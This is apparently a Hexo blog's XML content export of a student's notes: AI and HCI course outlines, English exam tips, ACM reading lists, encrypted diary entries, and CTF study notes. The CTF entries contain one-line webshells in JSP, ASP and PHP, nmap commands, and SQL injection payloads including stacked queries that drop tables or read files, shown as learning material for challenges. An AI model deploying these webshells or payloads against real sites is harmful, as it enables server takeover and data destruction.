bdd80df4d53ff1e084136900d3201a93895bf7acf92a142997ead1c2207d3698ff04cd29ccea0db669584c3a5b92029081770fd67798b44a3c29fe3e159eb5746b8f6e4bacd4dca921b39ea84edcd94f5004a29595564e2a2d8640328ba629013aa38e6971246c407b5f544ec7b022c7ec9f325aef7b349e942b3b891270953851fd323854676924167908e099aecc6c30d56d3e6f89cf9565ab21248b287c2bef59f8c20b8ae79668c25270259bef1aaf50b606625adbaf6f7635899644221b7969424f904db2745de87419fe1a795fb4c078f009ef1a3b863fe8424774d83db55d317e1be8bf58b315e51bd0051731ce94c2bd94f572f6f94bed5a2a24d8b55c157052d76b1accbbec3795afee0ccac5a355874152d7d1f460b74e00766b481e407db92743695dba206ad530259c4f56dba2bb3fb6dd0a4a1b9cf198293f9c8aa3fabde0f7e74da03bb5bf340edc191cbea994a1a7484e7c01ecc42433e602b28954a32ba395728aba432747399b3cb0089744674be87d14857dc0c88a9e09508777cd</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人机交互与界面设计</title>
      <link href="/2020/learning/2019-2020s/%E4%BA%BA%E6%9C%BA%E4%BA%A4%E4%BA%92%E4%B8%8E%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1/"/>
      <url>/2020/learning/2019-2020s/%E4%BA%BA%E6%9C%BA%E4%BA%A4%E4%BA%92%E4%B8%8E%E7%95%8C%E9%9D%A2%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="课程注意事项"><a href="#课程注意事项" class="headerlink" title="课程注意事项"></a>课程注意事项</h2><p>课堂签到、测验、作业、讨论是必做题。课堂签到课堂结束后立刻收集，请假请提前。 测验、作业、讨论上课当天20：00收集。</p><h2 id="课程设计"><a href="#课程设计" class="headerlink" title="课程设计"></a>课程设计</h2><p>课程设计可以选择老师指定题目或自选题目。</p><ol><li>指定题目的要求详情见附件。</li></ol><p>HCI课程设计-2020.pdf</p><ol start="2"><li>自选题目有如下要求：</li></ol><p>1）难度应与指定题目相当；</p><p>2）需要自行撰写题目描述，提前报备给老师。获得同意后才可进行。</p><ol start="3"><li><p>课程设计可自行完成，也可2人一组合作，但每人的工作量要求和上述要求相同。撰写报告时，最多有20%的重复内容。</p></li><li><p>所有提交内容放在压缩包中，通过上传附件的形式提交。 压缩包名为全英文的学号-姓名-hci2020-项目名，例如100001-qinyanxia-hci2020-DHUTour.zip</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人机交互 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-4-26</title>
      <link href="/2020/diary/2020-4/2020-4-26/"/>
      <url>/2020/diary/2020-4/2020-4-26/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="79db4435881e66cced3b027cafe2c259b28bc9edacde614541fdf1021ae50f00">e32c27e47419b87d293b9e8ce412adf8e1e5f2595d32940c6dea9f0ba1a493becabf3d7ec3583ecb4b1b02414756c210f4e3e8f8bcb10a314c44701a8db130a75d31e36fedda51542bf44df5220b720864a459b91e872b60493e747abf3290df63f09b37b3965ff72530a272fcd88a67f2f24589d9d833f8835e85e27183c4dce944aa82040e95edbe8a3f94d0ac8d0ee3ad05efc231deca2f35e2d8c2a276b4cbd6abdc5ef78962329165e8f8b907c2453829dd026280e9b1e75322ae25579a748b3d580b2caa40747953cbaf23dfa6d47df73a47d901ed9f6f56190b677b1391508ef460a78d8da09bfcf53f019b56</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能课程要点</title>
      <link href="/2020/learning/2019-2020s/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9/"/>
      <url>/2020/learning/2019-2020s/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E8%AF%BE%E7%A8%8B%E8%A6%81%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>人工智能导论一课的学习要点。期末复习必备哟。<br>开卷<br>交作业邮箱<a href="mailto:786110421@qq.com">786110421@qq.com</a></p><a id="more"></a><h2 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h2><ol><li>人工智能的发展历程，所经过的不同兴衰时期和代表性的人物和技术成果</li><li>人工智能三种不同主义学派的特点和发展历程与冲突点</li><li>人工智能与计算机学科专业的联系</li><li>人工智能的分类、研究目标与基本内容</li><li>了解人工智能的研究与应用领域</li></ol><h2 id="第二章-知识表示方法"><a href="#第二章-知识表示方法" class="headerlink" title="第二章 知识表示方法"></a>第二章 知识表示方法</h2><p>了解知识表示的目的和作用，主要的知识表示方法有哪些？</p><h3 id="状态空间法"><a href="#状态空间法" class="headerlink" title="状态空间法"></a>状态空间法</h3><ol><li>状态空间表示的构成要素是什么？ 状态、算符、状态空间</li><li>状态与算符的关系是什么？</li><li>在进行状态空间表示时，具体通过哪三个部分组织起来？又以何种形式组织起来？</li><li>理解状态图示法的构成形式和表示方法，按路径搜索解的原理。</li></ol><h3 id="问题归约法"><a href="#问题归约法" class="headerlink" title="问题归约法"></a>问题归约法</h3><ol><li>什么是问题归约法？基本原理是怎样的？采用这种方法的意义是什么？</li><li>理解什么是本原问题，以及如何将原始问题逐层划分为多个子问题，直到得到本原问题。</li><li>掌握与或图的表示方法，和树状的结构特点。</li><li>不可解节点的定义。</li><li>状态空间表示法与归约表示法的区别和联系？</li></ol><h3 id="谓词逻辑表示法"><a href="#谓词逻辑表示法" class="headerlink" title="谓词逻辑表示法"></a>谓词逻辑表示法</h3><ol><li>结合离散数学知识，理解谓词逻辑表示的概念，数学演绎的作用</li><li>基本的谓词演算概念和符号表示，包括原子公式，合式公式的构成</li><li>掌握连词和量词的使用方法</li><li>理解合式公式的等价性表示</li><li>理解置换与合一的概念</li></ol><h3 id="语义网络法"><a href="#语义网络法" class="headerlink" title="语义网络法"></a>语义网络法</h3><ol><li>语义网络的基本构成和特点是什么？</li><li>语义网络中的节点和弧线的含义代表什么？</li><li>语义网络与谓词逻辑的联系，如何构建语义网络？</li><li>语义网络的继承与匹配原理</li></ol><h3 id="框架法"><a href="#框架法" class="headerlink" title="框架法"></a>框架法</h3><ol><li>理解框架，本体和过程表示的含义、原理及基本构成</li><li>了解框架，本体和过程表示的特点、优势与缺陷</li><li>掌握本章各种知识表示方法间的区别与联系</li></ol><h2 id="第3章-确定性推理（上）"><a href="#第3章-确定性推理（上）" class="headerlink" title="第3章 确定性推理（上）"></a>第3章 确定性推理（上）</h2><p>3.1 图搜索策略<br>3.2 盲目搜索<br>3.3 启发式搜索</p><ol><li>搜索策略与知识表示的关系？</li><li>掌握图搜索的一般过程，OPEN表和CLOSED表的作用与物理意义，节点的结构特征</li><li>什么是盲目搜索，主要的盲目搜索策略有哪些？在图搜索一般过程的基础上，找到并理解它们各自的区别在哪里？优劣势又在哪里？</li><li>相对盲目搜索，为何要引入启发式搜索？</li><li>什么是估价函数？其值的大小所蕴含的物理意义在哪？定义或选择估价函数的一般方式是什么？怎么理解它所反映的希望程度？</li><li>有序搜索的基本原理</li><li>A*算法的基本原理，其中g(n)和h(n)的含义与作用？</li></ol><h2 id="第3章-确定性推理（下）"><a href="#第3章-确定性推理（下）" class="headerlink" title="第3章 确定性推理（下）"></a>第3章 确定性推理（下）</h2><p>3.4 消解推理——重点<br>3.5 规则演绎系统——了解<br>3.6 产生式系统<br>3.7 非单调推理——了解  </p><ol><li>消解式是什么？</li><li>谓词演算公式转换为子句集的步骤</li><li>理解五种常见的消解推理规则，知道如何进行消解反演</li><li>规则演绎系统的规则是什么？了解正向、逆向推理的一般过程</li><li>产生式系统的主要构成及各部分的作用，有哪几种推理方式？</li><li>相比单调推理，非单调推理的优势体现在哪？了解两种非单调推理的原理</li></ol><h2 id="第4章-非经典推理（上）"><a href="#第4章-非经典推理（上）" class="headerlink" title="第4章 非经典推理（上）"></a>第4章 非经典推理（上）</h2><p>4.1 经典推理和非经典推理<br>4.2 不确定性推理<br>4.3 概率推理<br>4.4 主观贝叶斯方法（先学习知识和证据的不确定性表示部分）</p><ol><li>经典和非经典逻辑推理间的区别在哪？</li><li>不确定性推理的基本思路和特点，不确定性表示和算法中需解决的问题</li><li>不确定性量度如何设置？作用是什么？主要的不确定性更新算法有哪些？</li><li>概率推理的基本原理，以及它的优点和缺点是什么？</li><li>主观贝叶斯方法与概率推理的联系和区别是什么？为什么会引入主观贝叶斯方法？</li><li>主观贝叶斯方法中，知识和证据的不确定性表示分别的作用在哪？</li></ol><h2 id="第4章-非经典推理（下）"><a href="#第4章-非经典推理（下）" class="headerlink" title="第4章 非经典推理（下）"></a>第4章 非经典推理（下）</h2><p>4.4 主观贝叶斯方法（推理部分）<br>4.5 可信度方法<br>4.6 证据理论  </p><ol><li>主观贝叶斯方法的一般推理步骤是怎样的？</li><li>什么是可信度？可信度因子由哪两部分构成？它们分别的定义、数学表达以及性质是什么？</li><li>可信度方法中，如何组合证据不确定性，以及进行不确定性传递？</li><li>证据理论用来描述和处理知识不确定性的主要概念有哪些？它们之间的区别和联系在哪？</li><li>进行证据理论的不确定性推理的一般过程是怎样的？证据理论有哪些优缺点？</li></ol><h2 id="第5章-计算智能（上）"><a href="#第5章-计算智能（上）" class="headerlink" title="第5章 计算智能（上）"></a>第5章 计算智能（上）</h2><p>5.1 概述<br>5.2 神经计算</p><ol><li>计算智能与人工智能的区别和联系？计算智能系统主要特点和含义是什么？</li><li>人工神经网络研究的不同发展阶段代表性成果，人工神经网络的主要特性有哪些？</li><li>神经元的基本组成是什么？人工神经网络主要的结构类别包括哪些？人工神经网络可采用哪几种学习方式？</li><li>了解几种典型人工神经网络算法的原理和区别</li><li>理解和掌握人工神经网络进行知识表示和推理的过程</li></ol><h2 id="第5章-计算智能（中）"><a href="#第5章-计算智能（中）" class="headerlink" title="第5章 计算智能（中）"></a>第5章 计算智能（中）</h2><p>5.4 进化计算<br>5.5 人工生命  </p><ol><li>了解进化算法的发展历程，以及主要的进化算法。</li><li>进化算法相比基于梯度的优化方法的优势是什么？</li><li>进化算法框架构成，和驱使种群进化的算子是什么？</li><li>遗传算法编码和解码过程的基本原理。</li><li>掌握遗传算法中三个算子的运算原理，以及遗传算法的一般执行过程。</li><li>了解人工生命的基本内容。</li></ol><h2 id="第5章-计算智能（下）"><a href="#第5章-计算智能（下）" class="headerlink" title="第5章 计算智能（下）"></a>第5章 计算智能（下）</h2><p>5.3 模糊计算<br>5.6 粒子群优化算法<br>5.7 蚁群算法  </p><ol><li>群体智能的产生原理及其与自然界的联系</li><li>粒子群优化的定义及其与进化计算的差异</li><li>掌握PSO中个体最佳，全局最佳和局部最佳的更新方式</li><li>理解蚁群算法的原理及其解决TSP问题的过程</li><li>了解蚁群算法研究的发展历程和应用领域</li></ol><h2 id="第6章-专家系统（上）"><a href="#第6章-专家系统（上）" class="headerlink" title="第6章 专家系统（上）"></a>第6章 专家系统（上）</h2><p>6.1 专家系统概述  </p><ol><li>专家系统的定义</li><li>专家系统的主要特点和优点是什么？</li><li>专家系统的主要构成，以及专家系统与一般应用程序的区别是什么？</li><li>了解专家系统的一般构建步骤</li></ol><h2 id="第6章-专家系统（下）"><a href="#第6章-专家系统（下）" class="headerlink" title="第6章 专家系统（下）"></a>第6章 专家系统（下）</h2><p>6.2-6.6 基于规则、框架、模型、Web的和新型的专家系统<br>6.7-6.8专家系统的设计与开发工具</p><ol><li>了解基于规则、框架、模型、Web的和新型的专家系统的基本构成和特点</li><li>了解专家系统的一般设计过程；结合反向推理规则专家系统设计任务理解</li><li>了解常用的专家系统开发工具，对Matlab的相关工具箱有所了解</li></ol><h2 id="第7章-机器学习（上）"><a href="#第7章-机器学习（上）" class="headerlink" title="第7章 机器学习（上）"></a>第7章 机器学习（上）</h2><p>7.1机器学习的定义和发展历史<br>7.2机器学习的主要策略和基本结构<br>7.3归纳学习<br>7.5类比学习<br>7.6解释学习</p><ol><li>机器学习的定义及其发展的主要四个阶段特点</li><li>机器学习系统的基本结构组成</li><li>归纳学习的原理及其规则和方法的构建过程</li><li>类比学习的定义，构建类比推理学习的关键点</li><li>解释学习的过程和步骤</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>keep-learning</title>
      <link href="/2020/diary/keep-learning/"/>
      <url>/2020/diary/keep-learning/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="9194005b5cbd3e34bb5d897a6c2f397db71a8fa9fe01e83b9f85479d7caba728">e32c27e47419b87d293b9e8ce412adf8d69468130888bfb2317270217eb7ddebefaf593a88c457e15411bccb7addb9dd10da9a6b69bda3820bfc2ed74b7528adebc5d11d10f261f9e6e1a080d7d997f07864e8db2262a3a734e9a27b059bec7e8dbd47a9f7b55183f131df3c0b33a79c5acc7c720456678f1155da8d8c61451b31b80c278a5c15c3c709bbeb1efcc24fc4e3a64ed4cb0015ecdf5eaacde02b587177d213edc293ca4df161109b5b56490094c867df2cb5398e59e07c7e6cda83d0c241f2f08ba0f76756dc89aecb17d7b2a0404c47549fa344d79df9b96127356a8b21922dba57fb0f25914aafb93615062c854ea3c86b12e244236d3428d335f484ff9fc691fe55b502ce27d4e63dca4846d8539bc8cfe7cfa938901a3483010bc27241eebc71282ec2e30f9fb791cfb181b0608b122ce33f13a0dc8ab1266b68e20e705dce46471a58248f0654546884f445e44c16fba2b1388cafe094127200ae5911b4b0a7e43ad277279c107d4aed095807e09392149b45dbfb737e55c6e3d3e0f39a69aedd7158631cc4bb26468a085612f39808e8ee2e84eaaf0cabd91a00f85fd90b82c0277a15fb02afd005d0c7c6a8c4cdcdd2572ad36733e3de0e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CET4/6_pass_tricks</title>
      <link href="/2020/learning/CET4-6-pass-tricks/"/>
      <url>/2020/learning/CET4-6-pass-tricks/</url>
      
        <content type="html"><![CDATA[<p>关于四六级必过小技巧，可以说是坑蒙拐骗了  </p><a id="more"></a>  <h2 id="听力"><a href="#听力" class="headerlink" title="听力"></a>听力</h2><p>首先！！<br>必须先预读，看过题干不同选项，圈画出关键词！  </p><h3 id="答-蒙题技巧（误）转载自知乎"><a href="#答-蒙题技巧（误）转载自知乎" class="headerlink" title="答/蒙题技巧（误）转载自知乎"></a>答/蒙题技巧（误）转载自知乎</h3><p>一、女性的言行举止  </p><p>对话当中女性开口时，你一定要认真听了。女性提出的建议和要求，男性一般都会认同。  </p><p>女生一般都会比男生优秀，所以一般对话会呈现出女生表现比男生都好，无论什么方面，是各个方面。  </p><p>二、两个选项表达意思相近，选谁?  </p><p>哪个选项表述相对全面就选谁!  </p><p>三、两个选项表达意思相反，选谁?  </p><p>答案一定在这两者当中，这时候需要认真听一下内容，就能确定答案。实在听不懂，蒙一下，50%概率你对!  </p><p>四、关于态度选项  </p><p>要选择积极、乐观的正能量选项。  </p><p>五、长对话第一题，不出意外的话前三句出答案。  </p><p>六、当出现but, however,first,比较级,最高级……等等，这些地方有答案。  </p><p>七、买票买不上，作业写不完，考试很难，周围环境差，火车飞机晚点，老师要求严!这个很重要~  </p><h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><h3 id="选词填空"><a href="#选词填空" class="headerlink" title="选词填空"></a>选词填空</h3><p>首先分析词性并分类  </p><h3 id="长阅读"><a href="#长阅读" class="headerlink" title="长阅读"></a>长阅读</h3><p>先读句子再读长文，迅速定位！  </p><h3 id="阅读理解"><a href="#阅读理解" class="headerlink" title="阅读理解"></a>阅读理解</h3><p>先读题目在看原文<br>不要瞎想，脑补过多  </p><h3 id="蒙题技巧"><a href="#蒙题技巧" class="headerlink" title="蒙题技巧"></a>蒙题技巧</h3><p>一、选词填空优先选自己确定的选项，包括固定搭配等。  </p><p>二、选词填空剩下的不确定空格，可以按词性蒙填。  </p><p>三、对应原则  </p><p>阅读的选项一般都和文章某一句话对应，先找到原文，概括表达原文的选项一般为正确答案。  </p><p>四、正确选项与原文相似但不同  </p><p>阅读的正确答案一定与原文句子不同，答案一般是原文句子的另一种表达方法。  </p><p>五、出现同义词替换，是答案的概率最大。  </p><p>六、含有infer/conclude/imply/indicate/learn的题目，答案就在不远处。  </p><p>七、含有绝对性的词汇选项尽量不要选。如：must/always/no/all of ……  </p><h2 id="学英语的小习惯"><a href="#学英语的小习惯" class="headerlink" title="学英语的小习惯"></a>学英语的小习惯</h2><ol><li>发音准确，语调正确  </li><li>热爱英剧、美剧  </li><li>兴趣和英语相结合  </li><li>敢于说英语  </li><li>每天持续背单词  </li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>压缩文件</title>
      <link href="/2020/CTF/%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6/"/>
      <url>/2020/CTF/%E5%8E%8B%E7%BC%A9%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>关于压缩的文件的破解方式</p><a id="more"></a><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>rar zip</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ol><li>010editor 但不支持rar5</li><li>winhex<br>认准PK 和Rar！</li></ol><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><p>根据文件结构手动尝试<br>可用winrar修复</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>密码的范围比较小<br>工具： ARCHPR fcrackzip</p><h2 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h2><p>文件本身的长度小，可以列出所有可能的字符组合<br>工具：python binasscii,crc32()</p><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><p>想攻击的文件与一个已知文件在同一个压缩包中用同意密码加密<br>ARCHPR PKcrack<br>压缩方法一致，压缩后续大小相同就可</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc-all-in-one</title>
      <link href="/2020/CTF/misc-all-in-one/"/>
      <url>/2020/CTF/misc-all-in-one/</url>
      
        <content type="html"><![CDATA[<p>平时遇到的misc题都记录在这里</p><a id="more"></a><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><ol><li>探测开放的服务<br><code>nmap -sV IP</code></li><li>探测所有信息<br><code>nmap -A -v IP</code></li><li>探测操作系统的类型与版本<br><code>nmap -O IP</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>acm入门基础知识以及准备</title>
      <link href="/2020/ACM/acm-begin/"/>
      <url>/2020/ACM/acm-begin/</url>
      
        <content type="html"><![CDATA[<p>记录acm的学习方法</p><a id="more"></a><h2 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h2><p>推荐网站</p><ol><li><a href="https://vjudge.net/" target="_blank" rel="noopener">vjudge</a></li><li><a href="http://acm.hdu.edu.cn/listproblem.php?vol=11" target="_blank" rel="noopener">hdu</a></li><li><a href="https://www.luogu.com.cn/" target="_blank" rel="noopener">洛谷</a></li><li>poj</li></ol><h2 id="题库推荐"><a href="#题库推荐" class="headerlink" title="题库推荐"></a>题库推荐</h2><p><a href="https://vjudge.net/article/752" target="_blank" rel="noopener">kuangbin各种各样的题单</a></p><h2 id="竞赛参考书"><a href="#竞赛参考书" class="headerlink" title="竞赛参考书"></a>竞赛参考书</h2><p>《算法竞赛入门经典第2版》刘汝佳</p><p>《算法竞赛入门经典训练指南》刘汝佳</p><p>《挑战程序设计竞赛》秋叶拓哉</p><p>《算法竞赛入门到进阶》罗勇军 清华出版社 2019.6月将出版<br>ppt下载：<a href="https://github.com/luoyongjun999/code" target="_blank" rel="noopener">https://github.com/luoyongjun999/code</a></p><p>《ACM/ICPC算法训练教程》余立功</p><p>《ACM-ICPC程序设计系列 计算几何及应用》，金博，郭立，于瑞云</p><p>《ACM国际大学生程序设计竞赛 算法与实现》俞勇</p><p>《算法设计与分析基础（第2版）》，Anany Levitin著，潘彦译</p><p>《算法导论》，Thomas H. Cormen, Charles E.leiserson等著，潘金贵等译</p><p>《应用组合数学》，Fred S. Roberts, Barry Tesman著，冯速译</p><p>《数据结构与算法分析新视角》周幸妮等</p><p>《数据结构（STL框架）》王晓东</p><p>《初等数论及其应用》第6版，Kenneth H. Rosen著，夏鸿刚译</p>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webshell</title>
      <link href="/2020/CTF/webshell/"/>
      <url>/2020/CTF/webshell/</url>
      
        <content type="html"><![CDATA[<p>webshell</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>根据文件大小分类：大马和小马(通常指的是一句话木马，能够使用菜刀这类工具去直接连接它)</li><li>根据脚本名称分类：jsp、asp、aspx、php<ol><li>jsp<br><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></li><li>asp<br><code>&lt;%eval request(&quot;cmd&quot;)%&gt;</code></li><li>php<br><code>&lt;?php $a=exec($_GET[&quot;input&quot;]); echo $a; ?&gt;</code><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li></ol></li><li>可执行脚本<br>a.HTTP数据包($_GET、$_POST、$_COOKIES、$_SERVER[args]等)</li><li>数据传递</li><li>执行传递的数据<br>a.直接执行(eval、system、passthru等)<br>b.文件包含执行(include、require等)<br>c.动态函数执行($a=”phpinfo”;$a();)<br>d.Curly Syntax执行(${‘ls’})<br>e.preg_replace(第一个参数存在’/e’)<br>f.ob_start函数<br>g.回调函数(array_map等)<br>h.反序列化(unserialize等)</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlinject</title>
      <link href="/2020/CTF/sqlinject/"/>
      <url>/2020/CTF/sqlinject/</url>
      
        <content type="html"><![CDATA[<p>sql注入总结</p><a id="more"></a><h2 id="有过滤"><a href="#有过滤" class="headerlink" title="有过滤"></a>有过滤</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/select|update|delete|drop|insert|where|\./i"</span><span class="token punctuation">,</span><span class="token variable">$inject</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><h4 id="可以用预编译"><a href="#可以用预编译" class="headerlink" title="可以用预编译"></a>可以用预编译</h4><p>set用于设置变量名和值<br>prepare用于预备一个语句，并赋予名称，以后可以引用该语句<br>execute执行语句<br>deallocate prepare用来释放掉预处理的语句</p><pre><code>-1&#39;;set @sql = CONCAT(&#39;se&#39;,&#39;lect * from `1919810931114514`;&#39;);prepare stmt from @sql;EXECUTE stmt;1%27;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare%20execsql%20from%20@a;execute%20execsql;#</code></pre><p>使用了大小写绕过<code>strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)</code></p><h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><pre><code>1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></pre><h4 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h4><p><code>1&#39;;handler FlagHere open; handler FlagHere read first;</code></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>就是sql语句<code>;</code>结束后仍然可以执行操作<br>比如<code>1; DELETE FROM products</code></p><h3 id="用处"><a href="#用处" class="headerlink" title="用处"></a>用处</h3><ol><li>加载文件<br><code>select * from users where id=1;select load_file(&#39;c:/tmpupbbn.php&#39;);</code></li><li>删表<br><code>select * from users where id=1;drop table test;</code></li></ol><h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p>基于dvwa上的题获得的知识</p><h3 id="LOW-题目"><a href="#LOW-题目" class="headerlink" title="LOW 题目"></a>LOW 题目</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">// Get input </span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// Check database </span>    <span class="token variable">$getid</span>  <span class="token operator">=</span> <span class="token string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span><span class="token punctuation">;</span>     <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$getid</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Removed 'or die' to suppress mysql errors </span>    <span class="token comment" spellcheck="true">// Get results </span>    <span class="token variable">$num</span> <span class="token operator">=</span> @<span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// The '@' character suppresses errors </span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$num</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// Feedback for end user </span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>User ID exists in the database.&lt;/pre>'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// User wasn't found, so the page wasn't! </span>        <span class="token function">header</span><span class="token punctuation">(</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span> <span class="token string">'SERVER_PROTOCOL'</span> <span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">' 404 Not Found'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// Feedback for end user </span>        <span class="token keyword">echo</span> <span class="token string">'&lt;pre>User ID is MISSING from the database.&lt;/pre>'</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token punctuation">:</span> <span class="token 